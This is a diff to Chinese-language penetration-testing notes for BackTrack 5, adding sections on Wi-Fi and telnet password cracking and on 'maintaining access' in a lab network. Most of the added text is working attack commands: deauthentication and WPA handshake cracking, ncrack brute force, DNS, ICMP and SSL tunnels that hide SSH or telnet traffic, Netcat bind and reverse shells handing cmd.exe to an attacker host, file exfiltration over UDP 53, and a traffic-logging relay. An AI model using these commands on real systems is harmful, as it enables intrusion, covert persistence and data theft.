@@ -6,7 +6,7 @@
 * [五、BT5.2011.5.运用层攻击MSF](#五BT520115运用层攻击MSF) 
 * [六、BT5.2011.6.局域网攻击](#六BT520116局域网攻击) 
 * [七、BT5.2011.7.密码破解](#七BT520117密码破解) 
-
+* [八、BT5.2011.8.维持访问](#八BT520118维持访问) 
 
 
 ***
@@ -375,14 +375,156 @@ Spanning Tree Protocol生成树协议，可应用于网络中建立树g形拓扑
     注：配合setoolkit工具使用，克隆一个网站（如：mail.google.com的邮箱）
 ```
 ### 七、BT5.2011.7.密码破解
+#### 1、无线密码破解
+```
+    airmon-ng start wlan0
+    注：开始查看无线
+    airodump-ng -w mingjiaotest mon0
+    注：开始对所有网络监控
+    airodump-ng -c 5 -w mingjiaotest mon0
+    注：对5号信道进行监控
+    aireplay-ng -0 5 -a [AP的MAC地址] -c [客户的MAC地址] mon0
+    注：开始做5次deauth攻击
+    aricrack-ng -w [字典] mingjiaotest-*.cap 
+    注：破解密码 
+```
+#### 2、Cisco密码破解
+```
+    ncrack -U pass -v -P pass telnet://10.1.1.2
+    -U：user的字典
+    -P：密码的字典
+```
+### 八、BT5.2011.8.维持访问
+#### 1、DNS隧道技术
+```
+    网络拓扑规划：DNS服务器10.1.1.1，目标主机10.1.1.2，服务端10.1.1.100，客户端10.1.1.101
 
+    准备DNS服务器，正向查找区域里创建一个域（如：mingjiao.org），并创建一个主机映射（如：dnstunnelserver,主机(A),另一台主机IP10.1.1.100），再创建一个子域（如：dnstunnel），指定dnstunnel子域的域名服务器为dnstunnelserver.mingjiao.org
 
+    nslookup
+    set type=ns
+    dnstunnel.mingjiao.org
+    注：服务端测试dns
 
+    vi dns2tcpd.conf
+    listen=0.0.0.0
+    port=53
+    user=nobody
+    chroot=/tmp
+    domain=dnstunnel.mingjiao.org
+    resources=ssh:10.1.1.2:22
+    注：服务端主机配置文件，10.1.1.2为目标地址IP
+    dns2tcpd -F -d 1 -f dns2tcpd.conf
+    注：启动服务端，当请求dns，就把连接转到ssh：10.1.1.2:22上
 
+    dns2tcpc -z dnstunnel.mingjiao.org
+    注：客户端测试服务器状态
 
+    vi dns2tcpc.conf
+    domain=dnstunnel.mingjiao.org
+    resource=ssh
+    local_port=2222
+    debug_level=1
+    注：客户端配置文件
+    dns2tcpc -c -f dns2tcpc.conf
+    注：启动客户端，此时服务端和客户端有个DNS的隧道（UDP 53端口）
 
+    ssh -p 2222 cisco@127.0.0.1
+    注：客户端连接127.0.0.1：2222，就会把ssh请求封装在DNS隧道里，然后服务端会去连接10.1.1.2:22
+```
+#### 2、Ping隧道技术
+```
+    网络拓扑规划：目标主机10.1.1.2，服务端10.1.1.100，客户端10.1.1.101
 
+    ptunnel
+    注：服务器打开服务
+    ptunnel -p 10.1.1.100 -lp 2222 -da 10.1.1.2 -dp 22
+    注：客户端建立连接
 
+    ssh -p 2222 cisco@127.0.0.1
+    注：客户端连接127.0.0.1：2222，就会把ssh请求封装在PING隧道里，然后服务端会去连接10.1.1.2:22
+```
+#### 3、SSL隧道技术
+```
+    网络拓扑规划：目标主机10.1.1.2，服务端10.1.1.100，客户端10.1.1.101
 
+    vi stunnel.conf
+    cert=/etc/stunnel/stunnel.pem
+    chroot=/var/run/stunnel/
+    pid=/stunnel.pid
+    [telnets]
+    accept=2323
+    connect=10.1.1.2:23
+    注：服务端主机配置文件，10.1.1.2为目标地址IP，需要手动创建/var/run/stunnel目录
+    stunnel /etc/stunnel/stunnel.conf
+    注：启动服务端
 
+    vi stunnel.conf
+    chroot=/var/run/stunnel/
+    pid=/stunnel.pid
+    client=yes
+    [telnets]
+    accept=2323
+    connect=10.1.1.100:2323
+    注：客户端配置文件，需要手动创建/var/run/stunnel目录
+    stunnel /etc/stunnel/stunnel.conf
 
+    telnet 127.0.0.1 2323
+    注：客户端连接127.0.0.1：2323，就会把telnet请求封装在SSL隧道里，然后服务端会去连接10.1.1.2:22
+```
+#### 4、代理服务器3proxy
+```
+    网络拓扑规划：目标主机10.1.1.2，服务端10.1.1.100，客户端10.1.1.101
+
+    vi 3proxy.cfg
+    auth none
+    flush
+    external 10.1.1.100
+    internal 10.1.1.100
+    maxconn 300
+    tcppm 80 10.1.1.2 80
+    注：服务端主机配置文件
+    3proxy 3proxy.conf
+    注：启动服务端，当连接服务器10.1.1.100:80时，就把连接转到10.1.1.2:80上
+
+    http://10.1.1.100
+    注：客户端连接
+```
+#### 5、Netcat
+* 攻击主机主动连接
+```
+    nc.exe -d -L -p 1234 -e cmd.exe
+    注：NC制造后门（目标主机）
+    -p 1234：启动1234端口
+    -e cmd.exe：当1234端口被连接时，把cmd.exe返回客户端
+
+    nc 10.1.1.1 1234
+    注：攻击主机获得目标主机的cmd
+```
+* 攻击主机监听，等待被连接
+```
+    nc -l -p 1234
+    注：攻击主机1234端口上开启监听
+
+    nc.exe -d 10.1.1.101 1234 -e cmd.exe
+    注：目标主机连接攻击主机1234端口，并把cmd.exe送给攻击主机
+```
+* nc传送文件
+```
+    nc.exe -u 10.1.1.101 53 < test.txt
+    注：目标主机把test.txt文件通过UDP 53端口传送给10.1.1.101
+    nc -l -u -p 53 >fileyeslab.txt
+    注：攻击主机监听UDP 53端口，并把收到的文件保存到fileyeslab.txt
+```
+* nc启动中继
+```
+    vi telnet_relay
+    #!/bin/bash
+    nc -o telnet.hack.out 10.1.1.2 23
+    注：服务端主机配置文件，连接10.1.1.2 23时，把抓包输出到telnet.hack.out文件
+    nc -l -p 23 -e telnet_relay
+    注：攻击主机监听23端口
+
+    telnet 10.1.1.100
+    注：客户端连接10.1.1.100时，把连接传给10.1.1.2 23，并记录抓包
+```
